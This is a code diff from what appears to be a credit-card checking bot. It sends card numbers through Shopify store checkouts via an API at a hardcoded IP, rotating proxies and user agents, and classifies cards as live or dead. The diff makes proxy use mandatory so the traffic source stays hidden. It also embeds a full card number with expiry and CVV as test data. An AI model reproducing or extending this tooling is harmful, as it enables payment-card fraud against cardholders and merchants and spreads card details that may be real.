@@ -5513,6 +5513,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           "proxy dead", "proxy error", "proxy authentication", "connection refused",
           "proxy connect", "tunneling socket", "proxy_error", "bad proxy",
           "cannot connect to host", "socks", "econnrefused", "econnreset",
+          "missing proxy param", '"error_code":"proxy dead"',
         ];
         const shSiteDeadIndicators = ["site dead"];
         const shUserAgents = [
@@ -5558,9 +5559,10 @@ Admin needs to add sites via Health Check.
 
           // Helper: single API call
           const callShopifyOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-            const apiUrl = proxy
-              ? `${SHOPIFY_API_URL}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-              : `${SHOPIFY_API_URL}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
+            if (!proxy) {
+              return { status: 'dead', message: 'Proxy Dead', rawResponse: 'Missing proxy param', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, apiResponse: 'Proxy Dead' };
+            }
+            const apiUrl = `${SHOPIFY_API_URL}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`;
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), 55000);
             try {
@@ -5917,7 +5919,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const mshStartTime = Date.now();
 
         const mshBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
-        const mshProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
+        const mshProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset", "missing proxy param", '"error_code":"proxy dead"'];
         const mshSiteDeadIndicators = ["site dead"];
         const mshUserAgents = [
           'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
@@ -5961,9 +5963,10 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
         // Single call helper
         const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-          const apiUrl = proxy
-            ? `${SHOPIFY_API_URL_MSH}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-            : `${SHOPIFY_API_URL_MSH}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}`;
+          if (!proxy) {
+            return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead' };
+          }
+          const apiUrl = `${SHOPIFY_API_URL_MSH}?${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`;
           const controller = new AbortController();
           const timeout = setTimeout(() => controller.abort(), 45000);
           try {
@@ -6371,7 +6374,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
          const mtxtStrikeResponses = ["MERCHANDISE_EXPECTED_PRICE_MISMATCH"];
          const mtxtSiteStrikeCounter: Record<string, number> = {};
          const MTXT_STRIKE_THRESHOLD = 3;
-         const mtxtProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
+         const mtxtProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset", "missing proxy param", '"error_code":"proxy dead"'];
          const mtxtSiteDeadIndicators = ["site dead"];
          const mtxtUserAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -6427,12 +6430,12 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
            return result;
          };
 
-          // Single API call — raw format: domain/?{cc}&url={site}&proxy={proxy}
+          // Single API call — raw format: domain/?{cc}&url={site}&proxy={proxy} (proxy REQUIRED)
            const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
              const cc = encodeURIComponent(cardCC.trim());
              const site = encodeURIComponent(siteUrl.trim());
-             const proxyPart = proxy?.trim() ? `&proxy=${encodeURIComponent(proxy.trim())}` : "";
-             return `${SHOPIFY_API_URL_MTXT}?${cc}&url=${site}${proxyPart}`;
+             const proxyEnc = encodeURIComponent((proxy || '').trim());
+             return `${SHOPIFY_API_URL_MTXT}?${cc}&url=${site}&proxy=${proxyEnc}`;
            };
 
           const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
@@ -9912,12 +9915,10 @@ ${resultsDisplay || "Waiting for results..."}
         return `${randomProxy.ip}:${randomProxy.port}`;
       };
 
-      // API endpoint for checking sites — proxy is OPTIONAL (direct call when empty)
+      // API endpoint for checking sites — proxy is REQUIRED by upstream API
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) =>
-          proxy
-            ? `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
-            : `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`,
+          `http://148.230.102.178:8081/?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy || '')}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
